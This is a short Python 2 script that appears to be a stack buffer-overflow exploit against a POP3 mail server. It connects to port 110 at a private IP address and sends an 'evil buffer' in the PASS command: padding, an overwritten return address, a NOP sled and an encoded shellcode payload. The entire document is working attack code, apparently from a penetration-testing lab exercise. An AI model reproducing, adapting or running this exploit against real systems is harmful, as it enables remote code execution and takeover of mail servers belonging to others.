#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode = (
"\xda\xda\xd9\x74\x24\xf4\x5f\xbd\x4c\x9f\x20\xe8\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x6f\x13\x03\x23\x8c\xc2\x1d\x47\x5a\x80"
"\xde\xb7\x9b\xe5\x57\x52\xaa\x25\x03\x17\x9d\x95\x47\x75\x12"
"\x5d\x05\x6d\xa1\x13\x82\x82\x02\x99\xf4\xad\x93\xb2\xc5\xac"
"\x17\xc9\x19\x0e\x29\x02\x6c\x4f\x6e\x7f\x9d\x1d\x27\x0b\x30"
"\xb1\x4c\x41\x89\x3a\x1e\x47\x89\xdf\xd7\x66\xb8\x4e\x63\x31"
"\x1a\x71\xa0\x49\x13\x69\xa5\x74\xed\x02\x1d\x02\xec\xc2\x6f"
"\xeb\x43\x2b\x40\x1e\x9d\x6c\x67\xc1\xe8\x84\x9b\x7c\xeb\x53"
"\xe1\x5a\x7e\x47\x41\x28\xd8\xa3\x73\xfd\xbf\x20\x7f\x4a\xcb"
"\x6e\x9c\x4d\x18\x05\x98\xc6\x9f\xc9\x28\x9c\xbb\xcd\x71\x46"
"\xa5\x54\xdc\x29\xda\x86\xbf\x96\x7e\xcd\x52\xc2\xf2\x8c\x3a"
"\x27\x3f\x2e\xbb\x2f\x48\x5d\x89\xf0\xe2\xc9\xa1\x79\x2d\x0e"
"\xc5\x53\x89\x80\x38\x5c\xea\x89\xfe\x08\xba\xa1\xd7\x30\x51"
"\x31\xd7\xe4\xf6\x61\x77\x57\xb7\xd1\x37\x07\x5f\x3b\xb8\x78"
"\x7f\x44\x12\x11\xea\xbf\xf5\xde\x43\xb1\xd9\xb7\x91\xcd\xe0"
"\xfc\x1f\x2b\x88\x12\x76\xe4\x25\x8a\xd3\x7e\xd7\x53\xce\xfb"
"\xd7\xd8\xfd\xfc\x96\x28\x8b\xee\x4f\xd9\xc6\x4c\xd9\xe6\xfc"
"\xf8\x85\x75\x9b\xf8\xc0\x65\x34\xaf\x85\x58\x4d\x25\x38\xc2"
"\xe7\x5b\xc1\x92\xc0\xdf\x1e\x67\xce\xde\xd3\xd3\xf4\xf0\x2d"
"\xdb\xb0\xa4\xe1\x8a\x6e\x12\x44\x65\xc1\xcc\x1e\xda\x8b\x98"
"\xe7\x10\x0c\xde\xe7\x7c\xfa\x3e\x59\x29\xbb\x41\x56\xbd\x4b"
"\x3a\x8a\x5d\xb3\x91\x0e\x6d\xfe\xbb\x27\xe6\xa7\x2e\x7a\x6b"
"\x58\x85\xb9\x92\xdb\x2f\x42\x61\xc3\x5a\x47\x2d\x43\xb7\x35"
"\x3e\x26\xb7\xea\x3f\x63"
)
buffer= "A" *2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16  + shellcode + "C" * (3500-2606-4-351-16)
try:
	print "\nSending evil buffer v1"
	connect=s.connect(('192.168.15.162',110))
	s.recv(1024)
	s.send('USER username \r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.send('QUIT\r\n')
	s.close()
	print "\nDone!."
except:
	print "Could not find POP3 server\r\n"
